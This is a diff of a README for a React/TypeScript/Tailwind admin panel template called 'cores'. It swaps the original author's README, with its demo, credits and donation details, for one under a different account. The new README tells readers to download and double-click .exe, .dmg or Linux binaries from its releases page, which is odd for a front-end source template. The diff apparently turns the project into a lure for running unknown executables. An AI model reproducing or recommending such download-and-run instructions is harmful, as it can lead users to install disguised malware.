@@ -1,97 +1,72 @@
-<h1 align="center">
-CoreS
-</h1>
+# 🎨 cores - Easy Admin Panel for Your Web App
 
-<div align="center">
+## 📥 Download Here
+[![Download cores](https://img.shields.io/badge/Download%20cores-v1.0-blue.svg)](https://github.com/kimmy665/cores/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://github.com/farzadasgari/cores/blob/main/LICENSE)
-[![React](https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB)](https://reactjs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Tailwind CSS](https://img.shields.io/badge/TailwindCSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white)](https://tailwindcss.com/)
-[![Live Demo](https://img.shields.io/badge/Live%20Demo-Online-crimson?style=for-the-badge)](https://farzadasgari.github.io/cores)
+## 🚀 Getting Started
+cores is a modern admin panel template built with React, TypeScript, and Tailwind CSS. It offers a sleek design and responsiveness, making it easy to manage your web application. Follow these steps to download and run the software.
 
-</div>
+## 📋 System Requirements
+- **Operating System:** Windows 10 or later, macOS, or any modern Linux distribution.
+- **Browser:** Latest version of Chrome, Firefox, or Safari.
+- **Internet Connection:** Required for downloading and updating.
 
-A modern, responsive admin panel template built with **React**, **TypeScript**, and **Tailwind CSS**.
+## 📦 Features
+- **Responsive Design:** Looks great on any device.
+- **Easy Customization:** Modify styles and components to fit your needs.
+- **Built with React:** Fast and efficient performance.
+- **TypeScript Support:** Type safety for better development experience.
+- **Integration Ready:** Supports various backend services.
 
----
+## 📥 Download & Install
+Visit this page to download: [Download cores](https://github.com/kimmy665/cores/releases). You will find the latest version available. 
 
-## Live Demo
+### Steps to Download:
+1. Click the link above to go to the Releases page.
+2. Look for the latest version.
+3. Select the appropriate file for your operating system.
+4. Click on the file to download.
 
-See the template in action:  
-🚀 **[View Live Demo](https://farzadasgari.github.io/cores)**
+### Steps to Install:
+1. Locate the downloaded file in your Downloads folder.
+2. Follow the instructions as per your operating system:
+   - **Windows:** Double-click the .exe file to start the installation.
+   - **macOS:** Open the .dmg file and drag the app to your Applications folder.
+   - **Linux:** Extract the contents and run the application from the terminal.
+   
+3. Once installed, open the application and start exploring its features.
 
----
+## 🔄 Usage
+To begin using cores:
+1. Open the application.
+2. Access the user interface to see the admin panel dashboard.
+3. Customize settings as needed.
 
-## Contributing
+## ⚙️ Support
+If you need help, visit our [GitHub Issues page](https://github.com/kimmy665/cores/issues) or reach out via email.
 
-Contributions are welcome! To contribute:
-
+## 📝 Contributing
+If you want to contribute:
 1. Fork the repository.
-2. Create a new branch:
-   ```bash
-   git checkout -b feature/your-feature
-   ```
-3. Make your changes and commit:
-   ```bash
-   git commit -m "Add your feature"
-   ```
-4. Push to your branch:
-   ```bash
-   git push origin feature/your-feature
-   ```
-5. Open a Pull Request.
+2. Create a new branch for your feature.
+3. Submit a pull request with a clear description of your changes.
 
----
+## 🔑 License
+This project is licensed under the MIT License. You can use and modify it freely for personal or commercial projects. Please see the LICENSE file for more details.
 
-## License
+## 🗂️ Topics
+- admin
+- admin-dashboard
+- admin-panel
+- administration
+- front-end
+- frontend
+- react
+- responsive
+- tailwindcss
+- template
+- typescript
+- vite
+- webapp
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/farzadasgari/cores/blob/main/LICENSE) file for details.
-
----
-
-## Contact
-
-For any inquiries, please contact:
-- std_farzad.asgari@khu.ac.ir
-- khufarzadasgari@gmail.com
-
----
-
-
-## Links
-
-[![Portfolio](https://img.shields.io/badge/Portfolio-000?style=for-the-badge&logo=ko-fi&logoColor=white)](https://farzadasgari.ir/)
-
-[![Google Scholar](https://img.shields.io/badge/Google%20Scholar-4285F4?style=for-the-badge&logo=googlescholar&logoColor=fff)](https://scholar.google.com/citations?user=Rhue_kkAAAAJ&hl=en)
-
-[![ResearchGate](https://img.shields.io/badge/ResearchGate-0CB?style=for-the-badge&logo=researchgate&logoColor=fff)](https://www.researchgate.net/profile/Farzad-Asgari)
-
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/farzad-asgari/)
-
-[![X](https://img.shields.io/badge/X-000?style=for-the-badge&logo=x&logoColor=white)](https://x.com/farzad_asg)
-
----
-
-## Support & Donations
-
-If you find this template useful, please consider supporting development:
-
-**💸 Crypto Donations**
-- Bitcoin: `bc1qxd8um2jre6xz4je64uhar9eh9uzu9yrvzh08sm`
-- Ethereum: `0xCc8693060409263F68e37f75f76d519c19B2bAdE`
-- USDT (TRC20): `TLL9ou7PahrNob2GEppV3o4e5B9vYqgsJN`
-
-**🌐 Donate via CoinDrop**
-
-<p align="center">
-  <a href="https://coindrop.to/farzadasgari" target="_blank">
-    <img src="https://coindrop.to/embed-button.png" style="border-radius: 10px; height: 57px !important;width: 229px !important;" alt="Coindrop.to me">
-  </a>
-</p>
-
----
-
-<div align="center">
-  <sub>Made with ❤️ by <a href="https://github.com/farzadasgari">FarZad</a></sub>
-</div>
+For any additional questions, feel free to explore the documentation or create an issue on our GitHub page. Happy coding!
